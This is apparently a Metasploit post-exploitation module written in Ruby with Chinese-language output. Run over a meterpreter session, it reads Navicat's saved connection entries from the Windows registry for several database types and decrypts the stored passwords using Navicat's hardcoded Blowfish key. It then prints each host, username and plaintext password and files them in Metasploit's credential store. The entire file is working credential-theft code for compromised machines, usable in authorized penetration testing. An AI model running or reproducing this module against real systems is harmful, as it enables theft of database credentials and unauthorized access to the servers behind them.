# -*- coding: UTF-8 -*-

class MetasploitModule <  Msf::Post
    include Msf::Post::Windows::Registry

    def initialize(info={})
        super(
            update_info(
                info,
                'Name'=> 'Windows Navicat 本地密码获取',
                'Description'=> %q{
                    从注册表中获取本地密码，测试环境为Navicat Premium 15/Windows 2008 Server R2
                },
                'References' => [
                    [ 'URL', 'https://rcoil.me/2019/09/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd/'],
                    [ 'URL', 'https://github.com/HyperSine/how-does-navicat-encrypt-password' ]
                ],
                'License'       => MSF_LICENSE,
                'Author'        => [ '3ricK5r'],
                'Platform'      => [ 'win' ],
                'SessionTypes'  => [ 'meterpreter' ]
            )
        )
    end

    def blowfish_encrypt(secret_key, payload)
        cipher = OpenSSL::Cipher.new('bf-ecb').encrypt
    
        cipher.padding = 0
        cipher.key_len = secret_key.length
        cipher.key     = secret_key
    
        cipher.update(payload) << cipher.final
    end

    def blowfish_decrypt(secret_key, data)
        cipher = OpenSSL::Cipher.new "bf-ecb"
        cipher.padding = 0
        cipher.key_len = secret_key.length
        cipher.key = secret_key
        cipher.decrypt
        (cipher.update(data) << cipher.final)
    end

    def strxor(str, second)
        str.bytes.zip(second.bytes).map { |a,b| (a^b).chr}.join
    end

    def decrypt(encrypted_data)
        password = ''
        return password unless encrypted_data
    
        sha1_key = '3DC5CA39'
        secret_key_hex = Digest::SHA1.hexdigest(sha1_key)
        secret_key = [secret_key_hex].pack("H*")
        iv = blowfish_encrypt(secret_key, "\xFF"*8)
        ciphertext = [encrypted_data].pack("H*")

        # print_status("#{secret_key}  #{iv.unpack('H*')}  #{ciphertext.unpack('H*')}")

        cv = iv
        full_round, left_length = ciphertext.length.divmod(8)

        # print_status("#{full_round}  #{left_length}")
        password = ''
        if full_round > 0 
            for i in 0..full_round-1 do
                t = blowfish_decrypt(secret_key, ciphertext[i*8, 8])
                # print_status("#{t}")
                t = strxor(t, cv)
                password += t
                cv = strxor(cv, ciphertext[i*8, 8])
            end
        end

        if left_length > 0
            cv = blowfish_encrypt(secret_key, cv)
            # print_status("#{ciphertext[8*full_round, left_length].unpack('H*')}, #{cv[0, left_length].unpack('H*')}")
            test_value = strxor(ciphertext[8*full_round, left_length], cv[0, left_length])
            # print_status("#{test_value}")
            password += test_value
        end

        password
    end

    def report_cred(opts)
        # host = framework.db.find_or_create_host(
        #     :workspace => myworkspace,
        #     :host      => opts[:ip],
        #     :state     => Msf::HostState::Unknown
        # )
        # print_status("#{host}")
      
        # serv = framework.db.find_or_create_service(
        #     :workspace => myworkspace,
        #     :host      => opts[:ip],
        #     :port      => opts[:port],
        #     :proto     => 'tcp',
        #     :state     => Msf::ServiceState::Unknown
        # )
        # print_status("#{serv}")


        service_data = {
            address: opts[:ip],
            port: opts[:port],
            service_name: opts[:service_name],
            protocol: 'tcp',
            workspace_id: myworkspace_id
        }
    
        credential_data = {
            origin_type: :session,
            session_id: session_db_id,
            post_reference_name: self.refname,
            module_fullname: fullname,
            username: opts[:user],
            private_data: opts[:password],
            private_type: :password
        }.merge(service_data)
        # print_status("#{credential_data}")

        cred = create_credential(credential_data)

        login_data = {
            core: cred,
            status: Metasploit::Model::Login::Status::UNTRIED
        }.merge(service_data)
        # print_status("#{login_data}")
        
        login = create_credential_login(login_data)
        # print_status("#{login}")
    end

    def run
        print_status("在计算机 #{sysinfo['Computer']} 上查找 Navicat 密码:")

        reg_keys = Hash.new

        reg_keys['mysql'] = 'HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers'
        reg_keys['mariadb'] = 'HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers'
        reg_keys['mongodb'] = 'HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers'
        reg_keys['mssql'] = 'HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers'
        reg_keys['oracle'] = 'HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers'
        reg_keys['postgres'] = 'HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers'
        reg_keys['sqlite'] = 'HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers'

        reg_keys.each_pair { | db_name, reg_key |
            subkeys = registry_enumkeys(reg_key)
            next if subkeys.nil?
            print_status("数据库类型: #{db_name}")
            subkeys.each do |subkey|
                enc_pwd_value = registry_getvaldata("#{reg_key}\\#{subkey}", 'Pwd')
                username_value = registry_getvaldata("#{reg_key}\\#{subkey}", 'UserName')
                port_value = registry_getvaldata("#{reg_key}\\#{subkey}", 'Port')
                host_value = registry_getvaldata("#{reg_key}\\#{subkey}", 'Host')
                next if enc_pwd_value.nil?

                pwd_value = decrypt(enc_pwd_value)

                print_good("\t连接名: #{subkey}")
                print_good("\t主机/端口: #{host_value}:#{port_value}")
                print_good("\t用户名: #{username_value}")
                print_good("\t加密密码: #{enc_pwd_value}")
                print_good("\t密码: #{pwd_value}")
                print_status("\t"+"-"*40)

                host_ip = nil
                begin
                    host_ip = client.net.resolve.resolve_host(host_value)[:ip]                    
                rescue => exception
                    
                ensure
                    
                end

                if host_ip.nil?
                    report_cred(
                        ip: host_value,
                        port: port_value,
                        service_name: db_name,
                        user: username_value,
                        password: pwd_value
                    )
                else
                    report_cred(
                        ip: host_ip,
                        port: port_value,
                        service_name: db_name,
                        user: username_value,
                        password: pwd_value
                    )
                end

                # break

            end
            # break
        }
    end

end